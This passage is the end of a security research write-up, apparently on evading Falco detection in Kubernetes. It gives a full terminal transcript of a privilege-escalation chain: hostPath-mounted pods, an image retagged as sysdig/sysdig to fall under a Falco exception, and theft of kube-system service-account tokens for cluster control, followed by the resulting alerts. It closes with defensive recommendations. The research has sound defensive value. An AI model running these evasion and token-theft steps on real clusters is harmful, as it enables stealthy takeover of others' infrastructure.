     docker.io/sysdig/sysdig, docker.io/falcosecurity/falco,
     sysdig/sysdig, falcosecurity/falco,
     fluent/fluentd-kubernetes-daemonset, prom/prometheus,
     ibm_cloud_containers)
     or (k8s.ns.name = "kube-system"))
```

Of course, we cannot modify the image name in the original repo, but we can "tag" our malicious image within the context of the local daemon. And the full attack chain looks as follows:

```
[Compromised Pod]
dashboard@dashboard-56755cd6c9-gg9w8:/tmp$ ./kctl run r00t3 --restart=Never -ti--rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/run","name": "test1"},{"mountPath": "/var/lib","name": "test2"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test1","hostPath":{"path": "/var/run"}},{"name":"test2","hostPath":{"path": "/var/lib"}}]}}'
If you don't see a command prompt, try pressing enter.
root@r00t3:/tmp# ./gdocker pull sshayb/fuber:latest
latest: Pulling from sshayb/fuber
Digest: sha256:7dc92083c2b5524103988234902ac20ccbebc326d4c04cd5ab9163b9ef69d725
Status: Image is up to date for sshayb/fuber:latest
docker.io/sshayb/fuber:latest
root@r00t3:/tmp# ./gdocker tag sshayb/fuber:latest sysdig/sysdig
root@r00t3:/tmp# env | grep KUBE
...
KUBERNETES_SERVICE_PORT=443
KUBERNETES_SERVICE_HOST=10.84.0.1
root@r00t3:/tmp# ./gdocker run --rm -it -v /var/lib:/var/lib sysdig/sysdig
root@8e5d231f002d:/tmp# ls
docker  fubers  gbash  gdocker  gkubectl  runc-nsenter
root@8e5d231f002d:/tmp# grep -iIrn kube-system /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/namespace
...
var/lib/kubelet/pods/dc186c2c-4990-4415-91d7-e04c1da8b091/volumes/kubernetes.io~secret/metrics-server-token-ckwnp/namespace:1:kube-system
/var/lib/kubelet/pods/e9349520-b007-4d33-9924-2fb25efdd891/volumes/kubernetes.io~secret/default-token-lg5nm/namespace:1:kube-system
...
root@8e5d231f002d:/tmp# cat /var/lib/kubelet/pods/e9349520-b007-4d33-9924-2fb25efdd891/volumes/kubernetes.io~secret/default-token-lg5nm/token
eyJh......0rxgzaSQ
root@8e5d231f002d:/tmp# TOKEN=eyJhbG...gzaSQ
root@8e5d231f002d:/tmp# KUBERNETES_SERVICE_PORT=443
root@8e5d231f002d:/tmp# KUBERNETES_SERVICE_HOST=10.84.0.1
root@8e5d231f002d:/tmp# ./gkubectl --token "$TOKEN" --insecure-skip-tls-verify --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT --cache-dir=/tmp auth can-i --list
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs   Resource Names   Verbs
*.*                                             []                  []     [*]
                                                [*]                 []     [*]
selfsubjectaccessreviews.authorization.k8s.io   []                  []     [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []
...
-----
[Falco]
10:46:24.847425566: Notice Unexpected connection to K8s API Server from container (command=kctl run r00t3 --restart=Never -ti --rm --image lol --overrides {"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/run","name": "test1"},{"mountPath": "/var/lib","name": "test2"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test1","hostPath":{"path": "/var/run"}},{"name":"test2","hostPath":{"path": "/var/lib"}}]}} k8s.ns=prd k8s.pod=dashboard-56755cd6c9-gg9w8 container=8f5761fed4da image=securekubernetes/example-dashboard:latest connection=10.80.0.7:51452->10.84.0.1:443) k8s.ns=prd k8s.pod=dashboard-56755cd6c9-gg9w8 container=8f5761fed4da
10:46:43.757631494: Notice Unexpected connection to K8s API Server from container (command=kctl run r00t3 --restart=Never -ti --rm --image lol --overrides {"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/run","name": "test1"},{"mountPath": "/var/lib","name": "test2"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test1","hostPath":{"path": "/var/run"}},{"name":"test2","hostPath":{"path": "/var/lib"}}]}} k8s.ns=prd k8s.pod=dashboard-56755cd6c9-gg9w8 container=8f5761fed4da image=securekubernetes/example-dashboard:latest connection=10.80.0.7:51564->10.84.0.1:443) k8s.ns=prd k8s.pod=dashboard-56755cd6c9-gg9w8 container=8f5761fed4da
```

As can be seen, the final result is absolute and stealthy control of the cluster. This is the most silent attack so far with only 2 NOTICEs from the initial invocation of kctl. Several things worth noticing:

* The first spawned container is non-privileged to avoid **Launch Privileged Container**
* When spawning the first container _/var/lib_ mapping is necessary to pass the access to the kubelet folders
* The second spawned container is nested within the first container
* The final command must specify the non-monitored cache directory, in this case _/tmp_. Otherwise **Write below root** rule is triggered multiple times (by default kubectl stores the cache in the _/root/.kube_ directory)

## Discussion and Recommendations

The power of Falco is not in individual rules, but in groups of rules triggering together and overlapping when malicious action is performed. As we saw from the previous section, bypassing ALL the rules required to accomplish an attack phase is possible, but challenging. This task will be further complicated by the existence of custom rulesets in a customer environment because those are invisible to the attacker as opposed to the default ruleset.

As in a case with all security products, good product security posture is about security layers and combination of security controls while not over-relying on one of the controls. Falco continues to be a great solution for detection phase of malicious activity within the cluster.  

Some general recommendations and suggestions:
- It seems that there is no easy way to prevent an attacker from bypassing the rules relying on _proc.name_ and _file.name_. I suggest rethinking the reliance on _proc.name_ and _file.name_ fields for the existing and future rules. 
- Too many rules include construct `and not` with every such construct being a potential for exception bypass.
- Review rule priorities in the bypass context - ease of evading WARNINGs and ERRORs through symlinks and executable naming often goes opposite to the difficulty in evading DEBUGs, INFOs and NOTICEs.
- For the CVE-specific rules periodic check of public exploits is needed.
- Encourage clients to develop their own private rulesets.
---

[^1]: https://man7.org/linux/man-pages/man2/dup2.2.html
[^2]: https://hub.docker.com/repository/docker/sshayb/fuber
[^3]: https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py
[^4]: https://sysdig.com/blog/cve-2021-3156-sudo-falco/
[^5]: https://falco.org/docs/rules/supported-fields/
[^6]: https://braiins.com/stratum-v2
[^7]: https://github.com/draios/sysdig/pull/655/commits/209888d7f37c4357b164ca12248a38bac9de2e4b
[^8]: https://www.youtube.com/watch?v=rBqBrYESryY
[^9]: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
